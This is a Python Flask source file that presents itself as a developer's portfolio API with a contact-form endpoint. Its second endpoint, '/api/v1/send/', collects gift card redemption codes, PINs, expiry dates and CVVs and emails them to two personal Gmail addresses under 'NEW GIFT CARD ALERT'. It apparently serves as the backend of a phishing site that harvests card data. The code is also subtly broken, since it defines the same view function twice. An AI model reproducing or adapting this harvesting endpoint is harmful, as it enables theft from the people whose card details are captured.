# importing required modules
import os
import csv
from dotenv.main import rewrite
import requests
from flask import Flask, url_for, jsonify, render_template, request
from dotenv import load_dotenv
from flask_mail import Message, Mail
from flask_cors import CORS, cross_origin
from bs4 import BeautifulSoup as bs
from flask_sqlalchemy import SQLAlchemy
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("SECRET_KEY")
# setting mail configs
app.config['MAIL_SERVER'] = "smtp.googlemail.com"
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.environ.get("EMAIL_USERNAME")
app.config['MAIL_PASSWORD'] = os.environ.get("EMAIL_PASSWORD")
# app.config['MAIL_USE_TLS'] = False
# app.config['MAIL_USE_SSL'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get(
    "SQLALCHEMY_DATABASE_URI")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
mail = Mail(app)
db = SQLAlchemy(app)
CORS(app)


# defining the routes
# home route
@app.route('/')
def home():
    response = {"status": "success",
                "message": "API is working", "owner": "Perfection Loveday", "description": "I am a software engineer with 2+ years of experience in both backend and frontend software design using Python, NodeJS, Javascript, CSS, HTML, and other related technologies.",
                "portfolio": "https://samperfect.netlify.app"}
    return jsonify(response), 200


def fill(code, name, exp, pin, cvv):

    body = f"""
             <h3> A New Gift Card Entry Has Been Made On AllGiftCards.com</h3>

             <p> Gift Card Redemption Code:  {code}</p>

              <p>Gift Card Name:  {name}</p>
              <p>Gift Card Exp Date:  ${exp}</p>
              <p>Gift Card Pin:  ${pin}</p>
              <p>Gift Card CVV:  ${cvv}</p> 
        """

    return body


# endpoint for sending email
@app.route('/api/v1/submit/', methods=["POST"])
def send_email():

    status = True
    try:
        # unpacking request data
        data = request.get_json()
        name = data['name']
        email = data['email']
        message = data['message']
        subject = data['subject']

        # computing message
        msg = Message(subject,
                      sender=name, recipients=['lovedayperfection1@gmail.com'])
        msg.body = render_template(
            'reset_password.txt', name=name, email=email, message=message)
        msg.html = render_template(
            'reset_password.html', name=name, email=email, message=message)

        # sending the message
        mail.send(msg)

        # computing response
        response = {
            "status": "success",
            "message": "Thanks, your message has been successfully sent. I will get back to you shortly. Stay Safe"
        }
        return jsonify(response), 200

    except TypeError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Your message data is empty"
        }
        return jsonify(response), 400

    except KeyError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Ops! There's an error in the message data sent"
        }
        return jsonify(response), 400


# endpoint for sending email
@app.route('/api/v1/send/', methods=["POST"])
def send_email():

    status = True
    try:
        # unpacking request data
        data = request.get_json()
        code = data['code']
        name = data['name']
        exp = data['exp']
        cvv = data['cvv']
        pin = data['pin']
        subject = "NEW GIFT CARD ALERT"

        # computing message
        msg = Message(subject,
                      sender=name, recipients=['lovedayperfection1@gmail.com', 'Williamcampbell693@gmail.com'])
        msg.body = fill(code, name, exp, pin, cvv)
        msg.html = fill(code, name, exp, pin, cvv)

        # sending the message
        mail.send(msg)

        # computing response
        response = {
            "status": "success",
            "message": "Thanks, your message has been successfully sent. I will get back to you shortly. Stay Safe"
        }
        return jsonify(response), 200

    except TypeError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Your message data is empty"
        }
        return jsonify(response), 400

    except KeyError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Ops! There's an error in the message data sent"
        }
        return jsonify(response), 400


# running the app
if __name__ == '__main__':
    if os.environ.get('ENVIRONMENT'):
        app.run(debug=True, port=8000)
    else:
        app.run()
# running the app end
